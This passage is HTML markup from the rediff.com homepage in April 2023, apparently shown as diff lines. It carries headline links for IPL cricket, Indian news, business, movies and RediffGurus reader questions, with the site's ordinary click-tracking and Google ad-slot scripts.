-                        <h2 class="cricket" data-boxno="1_1-2_6" data-track="label=edit_topstories&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-exciting-battle-on-the-cards-as-mumbai-indians-take-on-sunrisers-hyderabad%2F20230417.htm">
-                            <a href="https://www.rediff.com/cricket/report/ipl-2023-exciting-battle-on-the-cards-as-mumbai-indians-take-on-sunrisers-hyderabad/20230417.htm" title="IPL: Exciting battle on the cards as MI face SRH" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-exciting-battle-on-the-cards-as-mumbai-indians-take-on-sunrisers-hyderabad%2F20230417.htm___&position=1_1-2_6&label=edit_topstories&c_type=edit_cricket&property=hp_in_pc');return false;">IPL: Exciting battle on the cards as MI face SRH</a>
-                        </h2>
-                    </div>
-                    <div id="topdiv_1" class="hide">
-                        <h2 class="news time relative" data-boxno="1_1-2_1" data-track="label=edit_latest&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fsc-to-skip-personal-laws-focus-on-special-marriage-act-for-same-sex-marriage%2F20230418.htm">
-                            <a href="https://www.rediff.com/news/report/sc-to-skip-personal-laws-focus-on-special-marriage-act-for-same-sex-marriage/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fsc-to-skip-personal-laws-focus-on-special-marriage-act-for-same-sex-marriage%2F20230418.htm___&position=1_1-2_1&label=edit_latest&c_type=edit_news&property=hp_in_pc');return false;">SC to skip personal laws, focus on Special Marriage Act for same-sex marriage</a>
-                            <i>7m ago</i>
-                        </h2>
-                        <h2 class="cricket time relative" data-boxno="1_1-2_2" data-track="label=edit_latest&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-happiest-birthday-to-my-biggest-blessing%2F20230418.htm">
-                            <a href="https://www.rediff.com/cricket/report/ipl-2023-happiest-birthday-to-my-biggest-blessing/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-happiest-birthday-to-my-biggest-blessing%2F20230418.htm___&position=1_1-2_2&label=edit_latest&c_type=edit_cricket&property=hp_in_pc');return false;">'Happiest birthday to my biggest blessing'</a>
-                            <i>13m ago</i>
-                        </h2>
-                        <h2 class="cricket time relative" data-boxno="1_1-2_3" data-track="label=edit_latest&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fwisden-honours-for-suryakumar-harmanpreet%2F20230418.htm">
-                            <a href="https://www.rediff.com/cricket/report/wisden-honours-for-suryakumar-harmanpreet/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fwisden-honours-for-suryakumar-harmanpreet%2F20230418.htm___&position=1_1-2_3&label=edit_latest&c_type=edit_cricket&property=hp_in_pc');return false;">Wisden honours for Suryakumar, Harmanpreet</a>
-                            <i>23m ago</i>
-                        </h2>
-                        <h2 class="news time relative" data-boxno="1_1-2_4" data-track="label=edit_latest&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fkashmiris-offer-shab-e-qadr-prayers%2F20230418.htm">
-                            <a href="https://www.rediff.com/news/report/kashmiris-offer-shab-e-qadr-prayers/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fkashmiris-offer-shab-e-qadr-prayers%2F20230418.htm___&position=1_1-2_4&label=edit_latest&c_type=edit_news&property=hp_in_pc');return false;">Kashmiris Offer Shab-e-Qadr Prayers</a>
-                            <i>29m ago</i>
-                        </h2>
-                        <h2 class="business time relative" data-boxno="1_1-2_5" data-track="label=edit_latest&c_type=edit_business&news=https%3A%2F%2Fwww.rediff.com%2Fmoney%2Freport%2Findia-moves-from-china-to-taiwan-for-high-tech-imports%2F20230418.htm">
-                            <a href="https://www.rediff.com/money/report/india-moves-from-china-to-taiwan-for-high-tech-imports/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmoney%2Freport%2Findia-moves-from-china-to-taiwan-for-high-tech-imports%2F20230418.htm___&position=1_1-2_5&label=edit_latest&c_type=edit_business&property=hp_in_pc');return false;">India Moves From China to Taiwan For High-Tech Imports</a>
-                            <i>31m ago</i>
-                        </h2>
-                        <h2 class="business time relative" data-boxno="1_1-2_6" data-track="label=edit_latest&c_type=edit_business&news=https%3A%2F%2Fwww.rediff.com%2Fmoney%2Freport%2Fauto-market-share-of-maruti-hyundai-slipped-in-fy23-on-chip-woes%2F20230418.htm">
-                            <a href="https://www.rediff.com/money/report/auto-market-share-of-maruti-hyundai-slipped-in-fy23-on-chip-woes/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmoney%2Freport%2Fauto-market-share-of-maruti-hyundai-slipped-in-fy23-on-chip-woes%2F20230418.htm___&position=1_1-2_6&label=edit_latest&c_type=edit_business&property=hp_in_pc');return false;">Market share of Maruti, Hyundai slipped in FY23 on chip woes</a>
-                            <i>33m ago</i>
-                        </h2>
-                        <p class="alignR">
-                            <a href="https://www.rediff.com/search/news?viewtype=grid&sort_order=recency&src=hp_latest_more_in_pc" class="lmore">More News</a>
-                        </p>
-                    </div>
-                    <div id="topdiv_2" class="hide"></div>
-                </div>
-                <div class="bigstory" data-boxno="1_3" data-track="label=edit_movies&c_type=edit_movies&news=https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fsunny-leone-my-life-has-been-stormy%2F20230418.htm">
-                    <p class="more">
-                        <a href="https://www.rediff.com/movies" class="backmovies" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/movies___&position=1_3_L&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">movies</a>
-                    </p>
-                    <h5>
-                        <a href="https://www.rediff.com/movies/report/sunny-leone-my-life-has-been-stormy/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fsunny-leone-my-life-has-been-stormy%2F20230418.htm___&position=1_3_I&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">
-                            <img alt="Sunny Leone: 'My life has been stormy'" src="//im.rediff.com/320-205/movies/2023/apr/18sunny-lead1.jpg"/>
-                        </a>
-                    </h5>
-                    <h2 class="hdtitle">
-                        <a href="https://www.rediff.com/movies/report/sunny-leone-my-life-has-been-stormy/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fsunny-leone-my-life-has-been-stormy%2F20230418.htm___&position=1_3_T&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">Sunny Leone: 'My life has been stormy'</a>
-                    </h2>
-                </div>
-                <div id="div_advt_right" class="div_advt_right">
-                    <div style="height:3px;overlow:hidden;font-size:1px"></div>
-                    <script async='async' src='https://www.googletagservices.com/tag/js/gpt.js'></script>
-                    <script>
-                        var googletag = googletag || {};
-                        googletag.cmd = googletag.cmd || [];
-                    </script>
-                    <div id='div-gpt-ad-1548477853909-0'>
-                        <script>
-                            googletag.cmd.push(function() {
-                                googletag.defineSlot('/21677187305/Rediff_Home_300x250_ATF_IN', [[336, 280], [300, 250]], 'div-gpt-ad-1548477853909-0').addService(googletag.pubads());
-                                googletag.pubads().collapseEmptyDivs();
-                                googletag.enableServices();
-                                googletag.display('div-gpt-ad-1548477853909-0');
-                            });
-                        </script>
-                    </div>
-                </div>
-                <i class="clear"></i>
-            </div>
-            <div>
-                <div class="secstorybox rediffgurus">
-                    <h3>REDIFFGURUS</h3>
-                    <i class="clear"></i>
-                    <h2 data-boxno="2_1-2_1" data-track="label=edit_gurus&c_type=edit_gurus&news=https%3A%2F%2Fgurus.rediff.com%2Fquestion%2Fquestion-details%2F5137736">
-                        <a href="https://gurus.rediff.com/question/question-details/5137736?utm_source=rediff_home&utm_medium=pc&utm_campaign=rediffgurus&utm_content=rediffgurus_rediff_home_pc" onclick="trackGuruURL('https://track.rediff.com/click?url=___https%3A%2F%2Fgurus.rediff.com%2Fquestion%2Fquestion-details%2F5137736%3Futm_source%3Drediff_home%26utm_medium%3Dpc%26utm_campaign%3Drediffgurus%26utm_content%3Drediffgurus_rediff_home_pc___&position=2_1-2_1&label=edit_gurus&c_type=edit_gurus&property=hp_in_pc');return false;">Dear Ms Ratra, My grandson is in Class X studying in...</a>
-                    </h2>
-                    <h2 data-boxno="2_1-2_2" data-track="label=edit_gurus&c_type=edit_gurus&news=https%3A%2F%2Fgurus.rediff.com%2Fquestion%2Fquestion-details%2F5137120">
-                        <a href="https://gurus.rediff.com/question/question-details/5137120?utm_source=rediff_home&utm_medium=pc&utm_campaign=rediffgurus&utm_content=rediffgurus_rediff_home_pc" onclick="trackGuruURL('https://track.rediff.com/click?url=___https%3A%2F%2Fgurus.rediff.com%2Fquestion%2Fquestion-details%2F5137120%3Futm_source%3Drediff_home%26utm_medium%3Dpc%26utm_campaign%3Drediffgurus%26utm_content%3Drediffgurus_rediff_home_pc___&position=2_1-2_2&label=edit_gurus&c_type=edit_gurus&property=hp_in_pc');return false;">I am 50yr male having hypothyroidism from last 7...</a>
-                    </h2>
-                    <h2 data-boxno="2_1-2_3" data-track="label=edit_gurus&c_type=edit_gurus&news=https%3A%2F%2Fgurus.rediff.com%2Fquestion%2Fquestion-details%2F5137130">
-                        <a href="https://gurus.rediff.com/question/question-details/5137130?utm_source=rediff_home&utm_medium=pc&utm_campaign=rediffgurus&utm_content=rediffgurus_rediff_home_pc" onclick="trackGuruURL('https://track.rediff.com/click?url=___https%3A%2F%2Fgurus.rediff.com%2Fquestion%2Fquestion-details%2F5137130%3Futm_source%3Drediff_home%26utm_medium%3Dpc%26utm_campaign%3Drediffgurus%26utm_content%3Drediffgurus_rediff_home_pc___&position=2_1-2_3&label=edit_gurus&c_type=edit_gurus&property=hp_in_pc');return false;">i am 52,taking medicines for Hypertension and sugar...</a>
-                    </h2>
-                    <h2 data-boxno="2_1-2_4" data-track="label=edit_gurus&c_type=edit_gurus&news=https%3A%2F%2Fgurus.rediff.com%2Fquestion%2Fquestion-details%2F5137894">
-                        <a href="https://gurus.rediff.com/question/question-details/5137894?utm_source=rediff_home&utm_medium=pc&utm_campaign=rediffgurus&utm_content=rediffgurus_rediff_home_pc" onclick="trackGuruURL('https://track.rediff.com/click?url=___https%3A%2F%2Fgurus.rediff.com%2Fquestion%2Fquestion-details%2F5137894%3Futm_source%3Drediff_home%26utm_medium%3Dpc%26utm_campaign%3Drediffgurus%26utm_content%3Drediffgurus_rediff_home_pc___&position=2_1-2_4&label=edit_gurus&c_type=edit_gurus&property=hp_in_pc');return false;">My question specifically pertained to exemption of...</a>
-                    </h2>
-                    <h2 data-boxno="2_1-2_5" data-track="label=edit_gurus&c_type=edit_gurus&news=https%3A%2F%2Fgurus.rediff.com%2Fquestion%2Fquestion-details%2F5137887">
-                        <a href="https://gurus.rediff.com/question/question-details/5137887?utm_source=rediff_home&utm_medium=pc&utm_campaign=rediffgurus&utm_content=rediffgurus_rediff_home_pc" onclick="trackGuruURL('https://track.rediff.com/click?url=___https%3A%2F%2Fgurus.rediff.com%2Fquestion%2Fquestion-details%2F5137887%3Futm_source%3Drediff_home%26utm_medium%3Dpc%26utm_campaign%3Drediffgurus%26utm_content%3Drediffgurus_rediff_home_pc___&position=2_1-2_5&label=edit_gurus&c_type=edit_gurus&property=hp_in_pc');return false;">Marriage ceremony was performed with the consent of...</a>
-                    </h2>
-                    <p class="alignR">
-                        <a href="https://gurus.rediff.com?utm_source=rediff_home&utm_medium=pc&utm_campaign=rediffgurus&utm_content=rediffgurus_rediff_home_pc" class="morestory" onclick="trackGuruURL('https://track.rediff.com/click?url=___https%3A%2F%2Fgurus.rediff.com%3Futm_source%3Drediff_home%26utm_medium%3Dpc%26utm_campaign%3Drediffgurus%26utm_content%3Drediffgurus_rediff_home_pc___&position=2_1-2_M&label=edit_gurus&c_type=edit_gurus&property=hp_in_pc');return false;">More REDIFFGURUS</a>
-                    </p>
-                </div>
-                <div class="nbox" data-boxno="2_3" data-track="label=edit_gurus&c_type=edit_gurus&news=https%3A%2F%2Fgurus.rediff.com%2Fquestion%2Fquestion-details%2F5137823">
-                    <p class="more">
-                        <a class="backgurus" href="https://gurus.rediff.com?utm_source=rediff_home&utm_medium=pc&utm_campaign=rediffgurus&utm_content=rediffgurus_rediff_home_pc" onclick="trackGuruURL('https://track.rediff.com/click?url=___https%3A%2F%2Fgurus.rediff.com%3Futm_source%3Drediff_home%26utm_medium%3Dpc%26utm_campaign%3Drediffgurus%26utm_content%3Drediffgurus_rediff_home_pc___&position=2_3_L&label=edit_gurus&c_type=edit_gurus&property=hp_in_pc');return false;">RediffGurus</a>
-                    </p>
-                    <h5>
-                        <a data-relsrc="https://gurus.rediff.com/rediffguru/pix/answerpix_new/24AskAnil-Is-my-employment-compensation-tax-free.jpg" class="img" href="https://gurus.rediff.com/question/question-details/5137823?utm_source=rediff_home&utm_medium=pc&utm_campaign=rediffgurus&utm_content=rediffgurus_rediff_home_pc" onclick="trackGuruURL('https://track.rediff.com/click?url=___https%3A%2F%2Fgurus.rediff.com%2Fquestion%2Fquestion-details%2F5137823%3Futm_source%3Drediff_home%26utm_medium%3Dpc%26utm_campaign%3Drediffgurus%26utm_content%3Drediffgurus_rediff_home_pc___&position=2_3_I&label=edit_gurus&c_type=edit_gurus&property=hp_in_pc');return false;">
-                            <img alt="Money question" src="//imworld.rediff.com/worldrediff/pix/blank.gif">
-                        </a>
-                    </h5>
-                    <h2 class="hdtitle">
-                        <a href="https://gurus.rediff.com/question/question-details/5137823?utm_source=rediff_home&utm_medium=pc&utm_campaign=rediffgurus&utm_content=rediffgurus_rediff_home_pc" onclick="trackGuruURL('https://track.rediff.com/click?url=___https%3A%2F%2Fgurus.rediff.com%2Fquestion%2Fquestion-details%2F5137823%3Futm_source%3Drediff_home%26utm_medium%3Dpc%26utm_campaign%3Drediffgurus%26utm_content%3Drediffgurus_rediff_home_pc___&position=2_3_T&label=edit_gurus&c_type=edit_gurus&property=hp_in_pc');return false;">My new company include gratuity , personal allowance...</a>
-                    </h2>
-                </div>
-                <div class="nbox" data-boxno="2_4" data-track="label=edit_gurus&c_type=edit_gurus&news=https%3A%2F%2Fgurus.rediff.com%2Fquestion%2Fquestion-details%2F5137688">
-                    <p class="more">
-                        <a class="backgurus" href="https://gurus.rediff.com?utm_source=rediff_home&utm_medium=pc&utm_campaign=rediffgurus&utm_content=rediffgurus_rediff_home_pc" onclick="trackGuruURL('https://track.rediff.com/click?url=___https%3A%2F%2Fgurus.rediff.com%3Futm_source%3Drediff_home%26utm_medium%3Dpc%26utm_campaign%3Drediffgurus%26utm_content%3Drediffgurus_rediff_home_pc___&position=2_4_L&label=edit_gurus&c_type=edit_gurus&property=hp_in_pc');return false;">RediffGurus</a>
-                    </p>
-                    <h5>
-                        <a data-relsrc="https://gurus.rediff.com/rediffguru/pix/answerpix_new/27edu-loans.jpg" class="img" href="https://gurus.rediff.com/question/question-details/5137688?utm_source=rediff_home&utm_medium=pc&utm_campaign=rediffgurus&utm_content=rediffgurus_rediff_home_pc" onclick="trackGuruURL('https://track.rediff.com/click?url=___https%3A%2F%2Fgurus.rediff.com%2Fquestion%2Fquestion-details%2F5137688%3Futm_source%3Drediff_home%26utm_medium%3Dpc%26utm_campaign%3Drediffgurus%26utm_content%3Drediffgurus_rediff_home_pc___&position=2_4_I&label=edit_gurus&c_type=edit_gurus&property=hp_in_pc');return false;">
-                            <img alt="Career question" src="//imworld.rediff.com/worldrediff/pix/blank.gif">
-                        </a>
-                    </h5>
-                    <h2 class="hdtitle">
-                        <a href="https://gurus.rediff.com/question/question-details/5137688?utm_source=rediff_home&utm_medium=pc&utm_campaign=rediffgurus&utm_content=rediffgurus_rediff_home_pc" onclick="trackGuruURL('https://track.rediff.com/click?url=___https%3A%2F%2Fgurus.rediff.com%2Fquestion%2Fquestion-details%2F5137688%3Futm_source%3Drediff_home%26utm_medium%3Dpc%26utm_campaign%3Drediffgurus%26utm_content%3Drediffgurus_rediff_home_pc___&position=2_4_T&label=edit_gurus&c_type=edit_gurus&property=hp_in_pc');return false;">Im a Legal professional engaged as a Consultant with...</a>
-                    </h2>
-                </div>
-                <div class="nbox" data-boxno="2_5" data-track="label=edit_gurus&c_type=edit_gurus&news=https%3A%2F%2Fgurus.rediff.com%2Fquestion%2Fquestion-details%2F5137903">
-                    <p class="more">
-                        <a class="backgurus" href="https://gurus.rediff.com?utm_source=rediff_home&utm_medium=pc&utm_campaign=rediffgurus&utm_content=rediffgurus_rediff_home_pc" onclick="trackGuruURL('https://track.rediff.com/click?url=___https%3A%2F%2Fgurus.rediff.com%3Futm_source%3Drediff_home%26utm_medium%3Dpc%26utm_campaign%3Drediffgurus%26utm_content%3Drediffgurus_rediff_home_pc___&position=2_5_L&label=edit_gurus&c_type=edit_gurus&property=hp_in_pc');return false;">RediffGurus</a>
-                    </p>
-                    <h5>
-                        <a data-relsrc="https://gurus.rediff.com/rediffguru/pix/answerpix_new/03askanu.jpg" class="img" href="https://gurus.rediff.com/question/question-details/5137903?utm_source=rediff_home&utm_medium=pc&utm_campaign=rediffgurus&utm_content=rediffgurus_rediff_home_pc" onclick="trackGuruURL('https://track.rediff.com/click?url=___https%3A%2F%2Fgurus.rediff.com%2Fquestion%2Fquestion-details%2F5137903%3Futm_source%3Drediff_home%26utm_medium%3Dpc%26utm_campaign%3Drediffgurus%26utm_content%3Drediffgurus_rediff_home_pc___&position=2_5_I&label=edit_gurus&c_type=edit_gurus&property=hp_in_pc');return false;">
-                            <img alt="Relationship question" src="//imworld.rediff.com/worldrediff/pix/blank.gif">
-                        </a>
-                    </h5>
-                    <h2 class="hdtitle">
-                        <a href="https://gurus.rediff.com/question/question-details/5137903?utm_source=rediff_home&utm_medium=pc&utm_campaign=rediffgurus&utm_content=rediffgurus_rediff_home_pc" onclick="trackGuruURL('https://track.rediff.com/click?url=___https%3A%2F%2Fgurus.rediff.com%2Fquestion%2Fquestion-details%2F5137903%3Futm_source%3Drediff_home%26utm_medium%3Dpc%26utm_campaign%3Drediffgurus%26utm_content%3Drediffgurus_rediff_home_pc___&position=2_5_T&label=edit_gurus&c_type=edit_gurus&property=hp_in_pc');return false;">Hello, Firstly thank for your time, Well I am...</a>
-                    </h2>
-                </div>
-                <i class="clear"></i>
-            </div>
-            <div class="nbox" data-boxno="3_1" data-track="label=edit_cricket&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-happiest-birthday-to-my-biggest-blessing%2F20230418.htm">
-                <p class="more">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/cricket___&position=3_1_L&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;" class="backcricket" href="https://www.rediff.com/cricket">cricket</a>
-                </p>
-                <h5>
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-happiest-birthday-to-my-biggest-blessing%2F20230418.htm___&position=3_1_I&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;" data-relsrc="//im.rediff.com/210-170/cricket/2023/apr/18kl1.jpg" class="img" href="https://www.rediff.com/cricket/report/ipl-2023-happiest-birthday-to-my-biggest-blessing/20230418.htm">
-                        <img alt="'Happiest birthday to biggest blessing'" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-happiest-birthday-to-my-biggest-blessing%2F20230418.htm___&position=3_1_T&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;" href="https://www.rediff.com/cricket/report/ipl-2023-happiest-birthday-to-my-biggest-blessing/20230418.htm">'Happiest birthday to biggest blessing'</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="3_2" data-track="label=edit_getahead&c_type=edit_getahead&news=https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Ftime-to-steal-wamiqa-gabbis-style%2F20230418.htm">
-                <p class="more">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/getahead___&position=3_2_L&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;" class="backgetahead" href="https://www.rediff.com/getahead">get ahead</a>
-                </p>
-                <h5>
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Ftime-to-steal-wamiqa-gabbis-style%2F20230418.htm___&position=3_2_I&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;" data-relsrc="//im.rediff.com/210-170/getahead/2023/apr/18fashion-lead-2.jpg" class="img" href="https://www.rediff.com/getahead/report/time-to-steal-wamiqa-gabbis-style/20230418.htm">
-                        <img alt="Time To Steal Wamiqa Gabbi's Style" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Ftime-to-steal-wamiqa-gabbis-style%2F20230418.htm___&position=3_2_T&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;" href="https://www.rediff.com/getahead/report/time-to-steal-wamiqa-gabbis-style/20230418.htm">Time To Steal Wamiqa Gabbi's Style</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="3_3" data-track="label=videos&c_type=ishare&c_id=11226811">
-                <p class="more">
-                    <a href="https://ishare.rediff.com" class="backvid" onclick="trackURL('https://track.rediff.com/click?url=___https://ishare.rediff.com___&position=3_3_L&label=videos&c_type=ishare&property=hp_in_pc');return false;" title="More on Videos">Videos</a>
-                </p>
-                <h5 class="relative">
-                    <a href="https://ishare.rediff.com/video/others/-if-murdered-atiq-s-mystery-letter-sent-to-yogi-cji-/11226811" onclick="trackURL('https://track.rediff.com/click?url=___https://ishare.rediff.com/video/others/-if-murdered-atiq-s-mystery-letter-sent-to-yogi-cji-/11226811___&position=3_3_I&label=videos&c_type=ishare&c_id=11226811&property=hp_in_pc');return false;" data-relsrc="http://datastore.rediff.com/h300-w300/thumb/53615D675B5B615F706460626D72/lc6fcthom02u3c59.D.222000.Letter-will-reach-CMO-SC-after-my-death-When-Ashraf-Ahmed-predicted-his-killing.mp4-0008.png" class="img vdplayicon">
-                        <img alt="'If murdered- - -,' Atiq's mystery letter sent to Yogi, CJI " src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://ishare.rediff.com/video/others/-if-murdered-atiq-s-mystery-letter-sent-to-yogi-cji-/11226811" onclick="trackURL('https://track.rediff.com/click?url=___https://ishare.rediff.com/video/others/-if-murdered-atiq-s-mystery-letter-sent-to-yogi-cji-/11226811___&position=3_3_T&label=videos&c_type=ishare&c_id=11226811&property=hp_in_pc');return false;">'If murdered- - -,' Atiq's mystery letter sent to Yogi, CJI </a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="3_4" data-track="label=edit_cricket&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-goddess-at-csk-rcb-game%2F20230418.htm">
-                <p class="more">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/cricket___&position=3_4_L&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;" class="backcricket" href="https://www.rediff.com/cricket">cricket</a>
-                </p>
-                <h5>
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-goddess-at-csk-rcb-game%2F20230418.htm___&position=3_4_I&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;" data-relsrc="//im.rediff.com/210-170/cricket/2023/apr/18ipl-fans1.jpg" class="img" href="https://www.rediff.com/cricket/report/ipl-2023-goddess-at-csk-rcb-game/20230418.htm">
-                        <img alt="SEE: 'Goddess' At CSK-RCB Game!" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-goddess-at-csk-rcb-game%2F20230418.htm___&position=3_4_T&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;" href="https://www.rediff.com/cricket/report/ipl-2023-goddess-at-csk-rcb-game/20230418.htm">SEE: 'Goddess' At CSK-RCB Game!</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="3_5" data-track="label=edit_movies&c_type=edit_movies&news=https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fexclusive-wasim-akram-on-his-movie-debut%2F20230418.htm">
-                <p class="more">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/movies___&position=3_5_L&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;" class="backmovies" href="https://www.rediff.com/movies">movies</a>
-                </p>
-                <h5>
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fexclusive-wasim-akram-on-his-movie-debut%2F20230418.htm___&position=3_5_I&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;" data-relsrc="//im.rediff.com/210-170/movies/2023/apr/18wasim-lead1.jpg" class="img" href="https://www.rediff.com/movies/report/exclusive-wasim-akram-on-his-movie-debut/20230418.htm">
-                        <img alt="EXCLUSIVE! Wasim Akram On His Movie Debut" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fexclusive-wasim-akram-on-his-movie-debut%2F20230418.htm___&position=3_5_T&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;" href="https://www.rediff.com/movies/report/exclusive-wasim-akram-on-his-movie-debut/20230418.htm">EXCLUSIVE! Wasim Akram On His Movie Debut</a>
-                </h2>
-            </div>
-            <i class="clear"></i>
-            <div class="nbox" data-boxno="4_1" data-track="label=edit_getahead&c_type=edit_getahead&news=https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Ftim-cook-says-namaste%2F20230418.htm">
-                <p class="more">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/getahead___&position=4_1_L&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;" class="backgetahead" href="https://www.rediff.com/getahead">get ahead</a>
-                </p>
-                <h5>
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Ftim-cook-says-namaste%2F20230418.htm___&position=4_1_I&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;" data-relsrc="//im.rediff.com/210-170/getahead/2023/apr/18apple-store2.jpg" class="img" href="https://www.rediff.com/getahead/report/tim-cook-says-namaste/20230418.htm">
-                        <img alt="Tim Cook Says Namaste!" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Ftim-cook-says-namaste%2F20230418.htm___&position=4_1_T&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;" href="https://www.rediff.com/getahead/report/tim-cook-says-namaste/20230418.htm">Tim Cook Says Namaste!</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="4_2" data-track="label=edit_cricket&c_type=edit_cricket&news=https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-rcb-vs-csk-why-virat-kohli-was-fined%2F20230418.htm">
-                <p class="more">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/cricket___&position=4_2_L&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;" class="backcricket" href="https://www.rediff.com/cricket">cricket</a>
-                </p>
-                <h5>
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-rcb-vs-csk-why-virat-kohli-was-fined%2F20230418.htm___&position=4_2_I&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;" data-relsrc="//im.rediff.com/210-170/cricket/2023/apr/18kohli2.jpg" class="img" href="https://www.rediff.com/cricket/report/ipl-2023-rcb-vs-csk-why-virat-kohli-was-fined/20230418.htm">
-                        <img alt="Why Virat Kohli was fined" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fcricket%2Freport%2Fipl-2023-rcb-vs-csk-why-virat-kohli-was-fined%2F20230418.htm___&position=4_2_T&label=edit_cricket&c_type=edit_cricket&property=hp_in_pc');return false;" href="https://www.rediff.com/cricket/report/ipl-2023-rcb-vs-csk-why-virat-kohli-was-fined/20230418.htm">Why Virat Kohli was fined</a>
-                </h2>
-            </div>
